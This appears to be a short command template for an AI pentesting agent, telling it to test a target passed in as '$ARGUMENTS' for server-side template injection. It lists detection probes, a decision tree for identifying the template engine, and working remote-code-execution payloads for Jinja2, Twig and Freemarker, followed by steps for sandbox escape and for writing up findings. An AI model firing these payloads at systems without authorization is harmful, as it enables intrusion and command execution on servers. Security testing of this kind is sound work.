Test for Server-Side Template Injection on: $ARGUMENTS

1. **Identify template engines**: Detect from errors, headers, response patterns (Jinja2, Twig, Freemarker, Velocity, Pebble, Mako)
2. **Probe**: Inject detection payloads — {{7*7}}, ${7*7}, #{7*7}, <%= 7*7 %>, {7*7}, ${{7*7}}
3. **Identify engine**: Use decision tree — {{7*7}}=49? Try {{7*"7"}} — if 7777777 then Jinja2, if 49 then Twig
4. **Exploit**: Engine-specific RCE payloads:
   - Jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
   - Twig: {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
   - Freemarker: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
5. **Sandbox escape**: Test for restricted environments and bypass techniques
6. **Document**: Save to `engagements/<target>/findings/ssti-*.md` with CVSS score and PoC

Tools: tplmap, Burp Suite, manual testing
